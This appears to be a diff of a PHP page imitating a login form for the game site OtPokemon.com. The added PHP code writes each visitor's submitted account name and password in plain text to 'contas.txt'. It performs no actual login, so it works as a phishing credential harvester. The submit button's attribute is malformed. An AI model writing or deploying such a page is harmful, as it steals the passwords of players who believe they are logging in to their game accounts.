@@ -275,7 +275,7 @@ function mostrarsenha() {
  <label for="pwd"><h2>Senha:</h2>
  <input class="form-control" name="pwd" type="password" placeholder="Insira sua Senha neste campo." size="30" id="pwd" required></label>  <br><br><label for="show"><i>Mostrar senha</i></label> <input type="checkbox" onchange="mostrarsenha();" id="show"></center>
  
- <input type='submit' class="concluir" action="onClick="gravar()"" name='btnOK' value='Concluir'>
+ <input type='submit' class="concluir" action="onClick = "$gravar()"" name='btnOK' value='Concluir'>
   </div>
   </form>
 </div>
@@ -284,21 +284,28 @@ function mostrarsenha() {
   <div class="footer">OtPokemon.com</div>
 </footer>
 <?php
-function gravar(){
-	$senha =$_POST["pwd"];
-    $acc =$_POST["acc"];
-    $arquivo = "contas.txt";
-    $fp = fopen($arquivo, "a+");
- 
-    //Escreve no arquivo aberto.
-    fwrite($fp, "$acc\n$senha\n\n");
-     
-    //Fecha o arquivo.
-    fclose($fp);
+//Pegando os valores do formulário!
+$nome = $_POST["acc"]; 
+
+$senha = $_POST["pwd"]; 
+
+
+$documento = "$nome;$senha;\r\n";
+
+//Aqui você coloca o nome do arquivo que será gravado
+$arquivo = "contas.txt";
+
+//Abrimos o arquivo que será gravado.
+$abrir = fopen($arquivo, "a");
+
+//Gravamos no arquivo
+$gravar = fwrite($abrir, $documento);
+
+//Testa se foi gravado
+if($gravar){
+}else{
+echo"Não gravado!";
 }
- 
-gravar();
- 
 ?>
 </body>
 </html>
